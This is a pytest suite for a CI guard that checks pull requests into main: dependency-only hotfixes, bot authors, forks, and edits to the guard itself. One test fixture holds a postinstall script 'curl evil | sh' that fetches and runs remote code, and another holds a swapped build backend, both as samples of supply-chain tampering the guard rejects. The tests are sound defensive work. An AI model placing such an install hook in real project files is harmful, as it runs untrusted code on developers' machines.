"""Tests for promotion_guard.py. Offline: the GitHub API is a dict of canned answers."""
from __future__ import annotations

import base64
import json

import pytest

import promotion_guard as pg

REPO = "Semianalysis/example"


def pr(**kw):
    base = {
        "number": 7,
        "user": {"login": "someone"},
        "labels": [],
        "head": {"ref": "fix/x", "sha": "h" * 40, "repo": {"full_name": REPO}},
        "base": {"ref": "main", "sha": "b" * 40, "repo": {"full_name": REPO}},
    }
    base.update(kw)
    return base


def content(text: str) -> dict:
    return {"encoding": "base64", "content": base64.b64encode(text.encode()).decode()}


def fake(files, contents=None):
    """files: list of (path, status). contents: {(path, sha_char): text}."""
    contents = contents or {}

    def fetch(path):
        if "/pulls/7/files" in path:
            page = int(path.rsplit("page=", 1)[1])
            return [{"filename": p, "status": s} for p, s in files] if page == 1 else []
        if "/contents/" in path:
            p, ref = path.split("/contents/", 1)[1].split("?ref=")
            text = contents.get((p.replace("%2F", "/"), ref[0]))
            return None if text is None else content(text)
        raise AssertionError(path)
    return fetch


HOTFIX = [{"name": "security/hotfix"}]


def test_staging_promotion_passes():
    ok, msg = pg.decide(pr(head={"ref": "staging", "sha": "h", "repo": {"full_name": REPO}}), REPO, fake([]))
    assert ok and "promotion" in msg


def test_dependabot_passes():
    ok, _ = pg.decide(pr(user={"login": "dependabot[bot]"}), REPO, fake([]))
    assert ok


def test_fork_fails_even_from_staging():
    fork = {"ref": "staging", "sha": "h", "repo": {"full_name": "someone/example"}}
    ok, msg = pg.decide(pr(head=fork, user={"login": "dependabot[bot]"}), REPO, fake([]))
    assert not ok and "fork" in msg


def test_feature_pr_fails():
    ok, msg = pg.decide(pr(), REPO, fake([("src/app.ts", "modified")]))
    assert not ok and "staging" in msg


def test_label_without_dependency_only_change_fails():
    ok, msg = pg.decide(pr(labels=HOTFIX), REPO, fake([("package-lock.json", "modified"), ("src/a.ts", "modified")]))
    assert not ok and "src/a.ts: not a dependency file" in msg


def test_lockfile_only_hotfix_passes_with_label():
    files = [("package-lock.json", "modified"), ("web/pnpm-lock.yaml", "modified"), ("uv.lock", "modified"),
             ("svc/requirements-dev.txt", "modified")]
    ok, msg = pg.decide(pr(labels=HOTFIX), REPO, fake(files))
    assert ok and "label" in msg


def test_autopilot_app_needs_no_label():
    ok, msg = pg.decide(pr(user={"login": "sa-dependabot-autopilot[bot]"}), REPO, fake([("uv.lock", "modified")]))
    assert ok and "dependabot-autopilot" in msg


def test_github_dir_never_allowed():
    ok, msg = pg.decide(pr(labels=HOTFIX), REPO, fake([(".github/dependabot.yml", "modified")]))
    assert not ok and "not allowed" in msg


def test_removed_or_renamed_fails():
    ok, msg = pg.decide(pr(labels=HOTFIX), REPO, fake([("yarn.lock", "removed")]))
    assert not ok and "removed" in msg


def test_package_json_dependency_change_passes():
    before = json.dumps({"name": "x", "scripts": {"build": "next build"}, "dependencies": {"next": "16.4.1"}})
    after = json.dumps({"name": "x", "scripts": {"build": "next build"}, "dependencies": {"next": "16.4.2"},
                        "overrides": {"postcss": "8.5.6"}, "pnpm": {"overrides": {"a": "1"}}})
    files = [("package.json", "modified"), ("package-lock.json", "modified")]
    ok, msg = pg.decide(pr(labels=HOTFIX), REPO, fake(files, {("package.json", "b"): before, ("package.json", "h"): after}))
    assert ok, msg


def test_package_json_script_change_fails():
    before = json.dumps({"scripts": {"postinstall": "true"}, "dependencies": {"a": "1"}})
    after = json.dumps({"scripts": {"postinstall": "curl evil | sh"}, "dependencies": {"a": "2"}})
    ok, msg = pg.decide(pr(labels=HOTFIX), REPO,
                        fake([("package.json", "modified")], {("package.json", "b"): before, ("package.json", "h"): after}))
    assert not ok and "other than dependencies" in msg


def test_pyproject_dependency_change_passes_and_build_change_fails():
    before = '[project]\nname = "x"\ndependencies = ["requests==2.32.0"]\n[build-system]\nrequires = ["hatchling"]\n'
    deps = before.replace("2.32.0", "2.32.4") + '\n[tool.uv]\nconstraint-dependencies = ["urllib3>=2.5"]\n'
    ok, msg = pg.decide(pr(labels=HOTFIX), REPO,
                        fake([("pyproject.toml", "modified")], {("pyproject.toml", "b"): before, ("pyproject.toml", "h"): deps}))
    assert ok, msg
    build = before.replace('"hatchling"', '"evil-backend"')
    ok, msg = pg.decide(pr(labels=HOTFIX), REPO,
                        fake([("pyproject.toml", "modified")], {("pyproject.toml", "b"): before, ("pyproject.toml", "h"): build}))
    assert not ok and "other than dependencies" in msg


def test_unparseable_manifest_fails():
    ok, msg = pg.decide(pr(labels=HOTFIX), REPO,
                        fake([("package.json", "modified")], {("package.json", "b"): "{}", ("package.json", "h"): "{"}))
    assert not ok and "cannot parse" in msg


def test_canonical_guard_update_passes_other_guard_change_fails():
    canon = pg.canonical_template()
    ok, msg = pg.decide(pr(), REPO, fake([(pg.GUARD_PATH, "modified")], {(pg.GUARD_PATH, "h"): canon}))
    assert ok and "canonical" in msg
    crlf = canon.replace("\n", "\r\n")
    assert pg.decide(pr(), REPO, fake([(pg.GUARD_PATH, "modified")], {(pg.GUARD_PATH, "h"): crlf}))[0]
    ok, msg = pg.decide(pr(), REPO, fake([(pg.GUARD_PATH, "modified")], {(pg.GUARD_PATH, "h"): canon + "\n# x\n"}))
    assert not ok


def test_template_keeps_required_job_name():
    text = pg.canonical_template()
    assert "\n  main-promotion-guard:\n" in text
    assert "labeled" in text and "branches: [main]" in text


def test_is_lock():
    for p in ["a/package-lock.json", "requirements.txt", "requirements-prod.txt", "constraints.txt", "go.sum"]:
        assert pg.is_lock(p)
    for p in ["setup.py", "package.json", "Cargo.toml", "go.mod", "Dockerfile"]:
        assert not pg.is_lock(p)


@pytest.mark.parametrize("n_files", [0])
def test_empty_hotfix_fails(n_files):
    ok, msg = pg.decide(pr(labels=HOTFIX), REPO, fake([]))
    assert not ok and "no changed files" in msg
